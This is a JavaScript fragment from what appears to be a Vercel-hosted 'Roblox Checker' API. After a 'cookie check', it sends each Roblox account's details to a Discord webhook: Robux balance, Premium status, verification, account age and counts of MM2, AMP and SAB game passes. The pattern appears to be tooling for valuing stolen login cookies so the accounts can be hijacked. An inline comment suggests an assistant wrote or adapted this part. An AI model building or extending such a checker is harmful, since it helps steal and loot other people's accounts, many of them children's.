// ────────────────────────────────────────────────
//  Send to Discord webhook
// ────────────────────────────────────────────────
try {
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

  if (webhookUrl) {
    const createdFormatted = json.created !== 'failed to fetch'
      ? new Date(json.created).toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' })
      : 'Unknown';

    const embed = {
      title: `${json.username} / ${json.displayName}  •  ID: ${json.userId}`,
      description: `**Cookie check result** — ${new Date().toLocaleString()}`,
      color: 0x00D166, // green-ish
      fields: [
        { name: "Premium", value: json.hasPremium ? "Yes ✓" : "No ✗", inline: true },
        { name: "Email/Phone Verified", value: json.emailVerified ? "Yes ✓ (hat)" : "No ✗", inline: true },
        { name: "Robux", value: json.robux.toLocaleString() + " Robux", inline: true },
        { name: "Account Age", value: `${json.accountAgeDays} days`, inline: true },
        { name: "Created", value: createdFormatted, inline: true },
        { name: "MM2 Passes", value: mm2Count.toString(), inline: true },
        { name: "AMP Passes", value: ampCount.toString(), inline: true },
        { name: "SAB Passes", value: sabCount.toString(), inline: true },
      ],
      thumbnail: { url: json.avatarUrl || "https://via.placeholder.com/150?text=No+Avatar" },
      footer: { text: "Vercel • Roblox Checker" },
      timestamp: new Date().toISOString(),
    };

    // You can also add plain text content if you want ping / @role
    const payload = {
      // content: "<@&123456789> New checked account!",   // optional ping
      embeds: [embed],
    };

    const discordRes = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (!discordRes.ok) {
      console.error("Discord webhook failed:", await discordRes.text());
      // you can still return success to frontend even if discord fails
    }
  }
} catch (discordErr) {
  console.error("Discord sending error:", discordErr);
  // don't crash the API because of discord
}

// ── your original response ──
res.status(200).json({
  success: true,
  username: userData.name,
  displayName: userData.displayName || userData.name,
  userId: userData.id,
  hasPremium,
  robux,
  accountAgeDays,
  created: createdDate || 'failed to fetch',
  avatarUrl,
  hasGamePasses,
  emailVerified,
});
